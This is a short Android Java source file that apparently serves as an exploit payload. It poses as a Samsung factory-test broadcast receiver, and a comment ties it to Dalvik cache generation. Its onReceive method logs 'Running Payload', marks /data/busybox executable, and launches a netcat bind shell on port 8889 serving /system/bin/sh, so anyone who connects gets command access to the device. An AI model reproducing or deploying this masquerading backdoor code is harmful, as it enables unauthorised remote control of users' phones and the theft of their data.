package com.sec.factory.entry;
import java.lang.Class;
import java.io.File;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class FactoryTestBroadcastReceiver extends BroadcastReceiver {

    public FactoryTestBroadcastReceiver(){
      super();
    }

    public void onReceive(Context context, Intent intent) {
      Log.d("DalvikCache", "Running Payload");
     try {
      Runtime.getRuntime().exec("chmod 755 /data/busybox");
      Runtime.getRuntime().exec("/data/busybox nc -ll -p 8889 -e /system/bin/sh");
     }catch(Exception e){
     }
    }

    public static void main(String args[]){
      //This stub is needed so that the cache file is properly generated
    }
}
